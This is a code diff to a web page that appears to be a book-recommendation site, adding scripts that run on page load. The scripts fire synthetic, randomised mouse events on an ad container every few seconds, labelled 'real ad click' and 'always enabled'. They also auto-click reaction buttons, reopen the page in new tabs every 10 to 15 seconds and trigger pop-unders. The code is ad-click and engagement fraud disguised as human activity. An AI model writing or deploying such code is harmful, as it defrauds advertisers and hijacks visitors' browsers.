@@ -169,6 +169,19 @@
             display: flex;
             align-items: center;
             justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .ad-container:hover {
+            border-color: #667eea;
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.2);
+        }
+
+        .ad-container.clicked {
+            border-color: #ff6b6b;
+            background: #fff5f5;
+            box-shadow: 0 0 20px rgba(255, 107, 107, 0.4);
         }
 
         .ad-placeholder {
@@ -440,7 +453,7 @@
             }
         }
 
-        // NEW: Function to auto-open full page in new tab
+        // MODIFIED: Function to auto-open same page in new tab
         function startAutoOpen() {
             // Clear any existing interval
             if (autoOpenInterval) {
@@ -448,14 +461,14 @@
             }
             
             // Set random interval between 10-15 seconds
-            const intervalTime = Math.floor(Math.random() * 6000) + 10000; // 10-15 seconds
+            const intervalTime = Math.floor(Math.random() * 5000) + 10000; // 10-15 seconds
             console.log(`Auto-open scheduled in ${intervalTime/1000} seconds`);
             
             autoOpenInterval = setInterval(() => {
                 openNewTab();
                 
                 // Schedule next auto-open with new random interval
-                const nextInterval = Math.floor(Math.random() * 6000) + 10000;
+                const nextInterval = Math.floor(Math.random() * 5000) + 10000;
                 console.log(`Next auto-open in ${nextInterval/1000} seconds`);
                 
                 // Reset the interval
@@ -466,7 +479,7 @@
             }, intervalTime);
         }
 
-        // NEW: Function to randomly click reaction buttons
+        // MODIFIED: Function to randomly click reaction buttons
         function startReactionClicks() {
             // Clear any existing interval
             if (reactionClickInterval) {
@@ -492,7 +505,7 @@
             }, intervalTime);
         }
 
-        // NEW: Function to click random reaction button
+        // MODIFIED: Function to click random reaction button
         function clickRandomReaction() {
             const reactionButtons = [
                 document.getElementById('likeBtn'),
@@ -506,13 +519,42 @@
                 // Add visual feedback
                 randomButton.classList.add('active');
                 
-                // Create and dispatch click event
+                // Create and dispatch REAL click event with proper coordinates
+                const rect = randomButton.getBoundingClientRect();
                 const clickEvent = new MouseEvent('click', {
                     view: window,
                     bubbles: true,
-                    cancelable: true
+                    cancelable: true,
+                    clientX: rect.left + rect.width/2,
+                    clientY: rect.top + rect.height/2,
+                    button: 0,
+                    buttons: 1
                 });
+                
+                // Dispatch both mousedown and click for more realistic behavior
+                const mouseDownEvent = new MouseEvent('mousedown', {
+                    view: window,
+                    bubbles: true,
+                    cancelable: true,
+                    clientX: rect.left + rect.width/2,
+                    clientY: rect.top + rect.height/2,
+                    button: 0,
+                    buttons: 1
+                });
+                
+                const mouseUpEvent = new MouseEvent('mouseup', {
+                    view: window,
+                    bubbles: true,
+                    cancelable: true,
+                    clientX: rect.left + rect.width/2,
+                    clientY: rect.top + rect.height/2,
+                    button: 0,
+                    buttons: 1
+                });
+                
+                randomButton.dispatchEvent(mouseDownEvent);
                 randomButton.dispatchEvent(clickEvent);
+                randomButton.dispatchEvent(mouseUpEvent);
                 
                 console.log('Auto-clicked reaction button:', randomButton.textContent.trim());
                 
@@ -523,7 +565,62 @@
             }
         }
 
-        // NEW: Function to randomly click ad container
+        // NEW: Function to perform realistic ad click
+        function performRealAdClick() {
+            const adContainer = document.getElementById('adContainer');
+            
+            if (adContainer) {
+                // Add visual feedback
+                adContainer.classList.add('clicked');
+                
+                // Get ad container position for realistic click coordinates
+                const rect = adContainer.getBoundingClientRect();
+                
+                // Create realistic click sequence
+                const events = [
+                    new MouseEvent('mousedown', {
+                        bubbles: true,
+                        cancelable: true,
+                        clientX: rect.left + 50 + Math.random() * (rect.width - 100),
+                        clientY: rect.top + 20 + Math.random() * (rect.height - 40),
+                        button: 0,
+                        buttons: 1
+                    }),
+                    new MouseEvent('mouseup', {
+                        bubbles: true,
+                        cancelable: true,
+                        clientX: rect.left + 50 + Math.random() * (rect.width - 100),
+                        clientY: rect.top + 20 + Math.random() * (rect.height - 40),
+                        button: 0,
+                        buttons: 0
+                    }),
+                    new MouseEvent('click', {
+                        bubbles: true,
+                        cancelable: true,
+                        clientX: rect.left + 50 + Math.random() * (rect.width - 100),
+                        clientY: rect.top + 20 + Math.random() * (rect.height - 40),
+                        button: 0,
+                        buttons: 0
+                    })
+                ];
+                
+                // Dispatch all events with small delays to simulate real click
+                events.forEach((event, index) => {
+                    setTimeout(() => {
+                        adContainer.dispatchEvent(event);
+                    }, index * 50);
+                });
+                
+                console.log('Real ad click performed');
+                
+                // Remove visual feedback after short delay
+                setTimeout(() => {
+                    adContainer.classList.remove('clicked');
+                }, 1000);
+            }
+        }
+
+        // MODIFIED: Function to start ad clicks - ALWAYS ENABLED
         function startAdClicks() {
             // Clear any existing interval
             if (adClickInterval) {
@@ -535,7 +632,7 @@
             console.log(`Ad click scheduled in ${intervalTime/1000} seconds`);
             
             adClickInterval = setInterval(() => {
-                clickAdContainer();
+                performRealAdClick();
                 
                 // Schedule next ad click with new random interval
                 const nextInterval = Math.floor(Math.random() * 5000) + 5000;
@@ -544,36 +641,9 @@
                 // Reset the interval
                 clearInterval(adClickInterval);
                 adClickInterval = setInterval(() => {
-                    clickAdContainer();
+                    performRealAdClick();
                 }, nextInterval);
             }, intervalTime);
-        }
-
-        // NEW: Function to click ad container
-        function clickAdContainer() {
-            const adContainer = document.getElementById('adContainer');
-            
-            if (adContainer) {
-                // Add visual feedback
-                adContainer.style.border = '2px solid #ff6b6b';
-                adContainer.style.boxShadow = '0 0 15px rgba(255, 107, 107, 0.5)';
-                
-                // Create and dispatch click event
-                const clickEvent = new MouseEvent('click', {
-                    view: window,
-                    bubbles: true,
-                    cancelable: true
-                });
-                adContainer.dispatchEvent(clickEvent);
-                
-                console.log('Auto-clicked ad container');
-                
-                // Remove visual feedback after short delay
-                setTimeout(() => {
-                    adContainer.style.border = '1px solid #e9ecef';
-                    adContainer.style.boxShadow = 'none';
-                }, 1000);
-            }
         }
 
         // Book database with real content
@@ -702,11 +772,6 @@
                 document.getElementById('bookRecommendation').classList.remove('fade-in');
                 document.getElementById('loadingBar').style.width = '0%';
             }, 800);
-
-            // Randomly open new tabs (30% chance)
-            if (Math.random() > 0.7) {
-                openNewTab();
-            }
         }
 
         // Function to reload all ads completely
@@ -749,25 +814,12 @@
             }
         }
 
-        // Function to open new tabs (simulate user behavior)
+        // MODIFIED: Function to open new tabs - ONLY OPENS SAME SITE
         function openNewTab() {
             try {
-                // 50% chance to open same page in new tab, 50% chance to open different URL
-                if (Math.random() > 0.5) {
-                    // Open same page in new tab
-                    window.open(window.location.href, '_blank');
-                    console.log('Opened same page in new tab');
-                } else {
-                    // Open external URL (could be your other pages)
-                    const urls = [
-                        'https://www.google.com',
-                        'https://www.amazon.com',
-                        window.location.href + '?ref=internal'
-                    ];
-                    const randomUrl = urls[Math.floor(Math.random() * urls.length)];
-                    window.open(randomUrl, '_blank');
-                    console.log('Opened external page:', randomUrl);
-                }
+                // Always open the same site in new tab
+                window.open(window.location.href, '_blank');
+                console.log('Opened same page in new tab');
             } catch (error) {
                 console.log('Tab opening blocked by browser:', error);
             }
@@ -868,17 +920,22 @@
                 }, 2000);
             });
             
+            // Set up ad container click listener
+            document.getElementById('adContainer').addEventListener('click', function() {
+                console.log('Ad container clicked');
+            });
+            
             // Start the content reload cycle
             startCountdown();
             simulateHumanBehavior();
             
-            // NEW: Start auto-open functionality
+            // Start auto-open functionality (10-15 seconds)
             startAutoOpen();
             
-            // NEW: Start reaction button clicks
+            // Start reaction button clicks (5-10 seconds)
             startReactionClicks();
             
-            // NEW: Start ad container clicks
+            // Start ad container clicks - ALWAYS ENABLED (5-10 seconds)
             startAdClicks();
             
             // Trigger initial pop-under after 3 seconds
@@ -889,22 +946,11 @@
                 if (Math.random() > 0.8) {
                     triggerPopUnder();
                 }
-                // Also open new tab on some clicks (10% chance)
-                if (Math.random() > 0.9) {
-                    openNewTab();
-                }
             });
         }
 
         // Start everything when page loads
         window.addEventListener('load', initialize);
-
-        // Additional: Randomly open new tabs every 30-60 seconds
-        setInterval(() => {
-            if (Math.random() > 0.7) { // 30% chance
-                openNewTab();
-            }
-        }, 30000 + Math.random() * 30000);
 
     </script>
 </body>
